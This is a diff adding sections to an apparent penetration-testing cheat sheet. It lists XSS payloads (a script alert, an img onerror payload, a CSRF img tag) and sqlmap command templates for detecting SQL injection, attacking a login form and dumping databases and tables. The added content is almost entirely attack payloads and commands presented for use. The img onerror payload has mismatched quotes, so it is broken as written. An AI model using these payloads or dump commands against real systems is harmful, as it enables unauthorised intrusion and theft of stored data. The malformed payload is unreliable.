@@ -8,3 +8,42 @@ Apache:
 
 Coldfusion:
 
+-----
+|XSS|
+-----
+#Basic Script
+<script> alert('xss') </script>
+
+#Img script
+<img src='nop' onerror='alert('xss');" />
+
+------
+|SQLi|
+------
+#Sqlmap Banner check
+sqlmap -u [url] -p [parameter] --technique=[technique] --banner
+##Example
+sqlmap -u http://example.com/test.php?id=1 -p id --technique=U --banner
+
+#Sqlmap Login test
+sqlmap -u [url] --data [login segment] -p [parameter] -technique=[technique] --suffix=[suffix] --level 2 --risk 3 --banner
+##Example
+sqlmap -u http://example.com/login.php --data='username=test&password=test&submit=login' -p username --technique=B --suffix='; --' --level 2 --risk 3 --banner
+
+#User agent db dump
+sqlmap -u [url] --dbs --dump --technique=[technique] --keep-alive --level 3
+
+#Check for SQLi
+sqlmap -u [url]
+
+#Check Tables
+sqlmap -u [url] --tables
+
+#Dump Table
+sqlmap -u [url] -D [database] -T [table] --dump
+
+------
+|XSRF|
+------
+#Example
+<img src=[url+parameters]">
